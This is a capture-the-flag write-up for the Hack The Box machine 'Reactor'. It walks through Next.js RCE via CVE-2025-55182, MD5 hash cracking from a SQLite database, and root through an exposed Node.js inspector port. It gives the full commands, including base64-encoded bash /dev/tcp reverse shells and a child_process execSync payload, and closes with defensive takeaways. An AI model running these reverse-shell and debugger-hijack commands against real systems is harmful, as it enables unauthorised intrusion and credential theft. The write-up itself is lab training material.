---
title: "HTB: Reactor"
published: 2026-05-24
description: "Easy Linux box — unauthenticated Next.js dashboard to React2Shell RCE (CVE-2025-55182), SQLite credential looting, and root via a Node.js --inspect debug port."
image: "/covers/htb-reactor.png"
tags: ["HTB", "Linux", "Web", "RCE", "Next.js", "CVE", "Privilege Escalation", "Node.js"]
category: Offensive Security
draft: false
---

> **Operator:** Daryx · **Box:** Reactor · **Difficulty:** Easy · **OS:** Linux

A full compromise of the **Reactor** machine on Hack The Box — from an unauthenticated
reactor-monitoring dashboard all the way to a root shell, chaining a Next.js RSC
deserialization RCE, database credential reuse, and a root-owned Node.js debugger.

## Machine Information

| Field      | Details                                                     |
|------------|-------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Reactor) |
| Difficulty | Easy                                                        |
| OS         | Linux                                                       |
| Author     | Samurai                                                     |
| Solved by  | **Daryx**                                                   |
| Date       | May 24, 2026                                                |

## Attack Path at a Glance

| Phase                 | Technique                                                                | Result                          |
|-----------------------|--------------------------------------------------------------------------|---------------------------------|
| Recon                 | `nmap -A`                                                                 | Ports 22, 3000 identified       |
| Fingerprinting        | WhatWeb + page source                                                     | Next.js 15.0.3 → CVE-2025-55182 |
| Initial Access        | React2Shell via `Next-Action` header injection                           | Shell as `node`                 |
| Credential Extraction | SQLite database dump → MD5 hashes                                         | `engineer:reactor1` recovered   |
| Hash Cracking         | John the Ripper + rockyou.txt                                            | Password cracked                |
| Lateral Movement      | SSH with cracked credentials                                             | Shell as `engineer` + user flag |
| Privilege Escalation  | Node.js debug port (9229) → `process.mainModule.require`                 | Root shell + root flag          |

---

## 1. Reconnaissance

Kick things off with a full `nmap` service/version scan across all ports:

```bash
nmap -A -p- 10.129.1.198
```

**Open ports:**

| Port | Service | Details                             |
|------|---------|-------------------------------------|
| 22   | SSH     | OpenSSH 9.6p1 (Ubuntu)              |
| 3000 | HTTP    | Next.js — ReactorWatch application  |

Only two ports are exposed. SSH is a dead end without credentials, so the **Next.js
application on port 3000** becomes the primary attack surface.

---

## 2. Enumeration — ReactorWatch Dashboard & Version Fingerprinting

### 2.1 Web Application Fingerprinting

Fingerprint the stack with **WhatWeb**:

```bash
whatweb 10.129.1.198:3000
```

```text
http://10.129.1.198:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.1.198],
Script, Title[ReactorWatch | Core Monitoring System],
UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time],
X-Powered-By[Next.js]
```

The application is **ReactorWatch** — a *Nuclear Reactor Core Monitoring Dashboard* —
running on **Next.js 15.0.3**.

### 2.2 Unauthenticated Dashboard

Browsing to `http://10.129.1.198:3000` exposes a fully **unauthenticated** monitoring
dashboard leaking live reactor telemetry and on-site personnel.

| Panel          | Details                                            |
|----------------|----------------------------------------------------|
| Core Status    | Reactor Power 98.2%, Criticality 1.0002 (WARNING)  |
| Core Temp      | 324 °C                                             |
| Pressure       | 155 bar                                            |
| Coolant Flow   | 18.4 k m³/h (CAUTION)                              |
| Turbine Output | 1.21 GW                                            |

**On-site personnel disclosed:**

| Name                | Role                  | Status  |
|---------------------|-----------------------|---------|
| Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE  |
| Marcus Kim          | Senior Technician     | ONLINE  |
| James Thompson      | Safety Officer        | OFFLINE |

### 2.3 Directory Enumeration

Fuzz for hidden content with **Feroxbuster**:

```bash
feroxbuster -u http://10.129.1.198:3000 -C 404 \
  --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

```text
308  GET  http://10.129.1.198:3000/cgi-bin/ => http://10.129.1.198:3000/cgi-bin
```

A `/cgi-bin/` path on a Next.js app is unusual — but the real lead is the **framework
version itself**.

### 2.4 Version Vulnerability Research

Next.js **15.0.3** is affected by **CVE-2025-55182**, a critical prototype-pollution and
unsafe-deserialization bug in the React Server Components (RSC) handler — dubbed
**React2Shell**. It lets an unauthenticated attacker inject a payload via the
`Next-Action` header to reach **Remote Code Execution**.

> 📌 I broke down the root cause of this bug in a separate post:
> [CVE-2025-55182: ReactOOPS](/posts/cve-2025-55182-reactoops/).

---

## 3. Initial Access — CVE-2025-55182 (React2Shell RCE)

### 3.1 Vulnerability Background

The RSC handler in Next.js 15.0.3 processes the `Next-Action` header without adequate
sanitization. A crafted payload abusing prototype pollution and unsafe deserialization
executes arbitrary OS commands on the server — **no authentication required**.

### 3.2 RCE Verification

Confirm code execution with a public exploit for CVE-2025-55182:

```bash
python3 exploit.py --url http://10.129.1.198:3000 --cmd whoami
```

```text
Success
node
```

```bash
python3 exploit.py --url http://10.129.1.198:3000 --cmd pwd
```

```text
Success
/opt/reactor-app
```

The service runs as the low-privileged **`node`** user (`uid=999`).

### 3.3 Reverse Shell

Base64-encode the reverse shell to dodge quoting issues:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.130/9001 0>&1' | base64 -w 0
```

Start a listener on the attacker machine:

```bash
rlwrap nc -lnvp 9001
```

Trigger the payload through the exploit:

```bash
python3 exploit.py --url http://10.129.1.198:3000 \
  --cmd "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzAvOTAwMSAwPiYxCg== | base64 -d | bash"
```

**Shell obtained as `node`:**

```text
connect to [10.10.14.130] from (UNKNOWN) [10.129.1.198]
node@reactor:/opt/reactor-app$
```

---

## 4. Lateral Movement — SQLite Credential Extraction & Hash Cracking

### 4.1 Application File Enumeration

Enumerate the reactor application directory:

```bash
ls -la /opt/reactor-app
```

| File         | Notes                                     |
|--------------|-------------------------------------------|
| `.env`       | Application environment configuration     |
| `reactor.db` | SQLite database — readable by `node` user |

### 4.2 Database Credential Extraction

Open the SQLite database and dump the `users` table:

```bash
sqlite3 /opt/reactor-app/reactor.db
```

```sql
.tables
SELECT * FROM users;
```

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Two **MD5** password hashes recovered, for `admin` and `engineer`.

### 4.3 Hash Cracking

Crack the `engineer` hash with **John the Ripper**:

```bash
echo "39d97110eafe2a9a68639812cd271e8e" > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
```

```text
reactor1         (?)
1g 0:00:00:00 DONE (2026-05-24 00:48) 50.00g/s 16857Kp/s
```

> 🔑 **Credential recovered:** `engineer:reactor1`

### 4.4 SSH Access as Engineer

Authenticate over SSH with the cracked credentials:

```bash
ssh engineer@10.129.1.198
```

🚩 **User flag** retrieved from `/home/engineer/user.txt`.

---

## 5. Privilege Escalation — Node.js Debug Port Hijacking

### 5.1 Internal Service Enumeration

List listening ports from the `engineer` session:

```bash
ss -tulnp
```

```text
tcp  LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*
```

Port **9229** — the standard Node.js V8 Inspector/debugger port — is listening on
localhost. Processes started with `--inspect` expose remote code evaluation here via the
Chrome DevTools Protocol.

### 5.2 Identifying the Privileged Process

`/opt/uptime-monitor/` holds a Node.js uptime-monitoring worker:

```bash
cat /opt/uptime-monitor/worker.js
```

The script runs persistently, probing ReactorWatch every 30 seconds — and it's running
as **root**, exposing the debug port on `127.0.0.1:9229`.

### 5.3 SSH Port Forwarding

Since the debug port is bound to localhost, tunnel it to the attacker machine:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.1.198
```

### 5.4 Attaching to the Node.js Debugger

Connect with the built-in inspector client:

```bash
node inspect 127.0.0.1:9229
```

```text
connecting to 127.0.0.1:9229 ... ok
debug>
```

### 5.5 Code Execution as Root

A direct `require` fails in the debug context — but `process.mainModule.require` reaches
the module system:

```javascript
exec("process.mainModule.require('child_process').execSync('id').toString()")
```

```text
'uid=0(root) gid=0(root) groups=0(root)\n'
```

The worker is confirmed running as **root**. Trigger a reverse shell from the debug
console:

```javascript
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.130/9002 0>&1\"').toString()")
```

Listener on the attacker machine:

```bash
rlwrap nc -lnvp 9002
```

**Root shell obtained:**

```text
connect to [10.10.14.130] from (UNKNOWN) [10.129.1.198]
root@reactor:~#
```

🚩 **Root flag** retrieved from `/root/root.txt`.

---

## 6. Key Takeaways

- **Unauthenticated dashboards are more than information disclosure.** The ReactorWatch
  panel leaked personnel names and the exact tech stack — context that framed the whole
  attack. Even read-only dashboards deserve authentication.

- **Framework version disclosure is a direct path to exploitation.** The
  `X-Powered-By: Next.js` header plus WhatWeb pinpointed the version, making CVE lookup
  trivial. Suppressing version headers meaningfully raises the bar.

- **Embedded SQLite databases are a high-value credential store.** When the service
  account can read the app's bundled database, credential extraction is a single command.
  Keep secrets outside the web root with strict permissions.

- **Node.js `--inspect` on a privileged process is a root shell.** The Chrome DevTools
  Protocol grants unrestricted JS execution inside the target process. Any root-owned
  Node.js service exposing `--inspect`/`--inspect-brk` — even on localhost — is a privesc
  vector the moment a low-priv account can port-forward to it.

---

*Owned by **Daryx** — Red Team Engineer & Offensive Security researcher.*
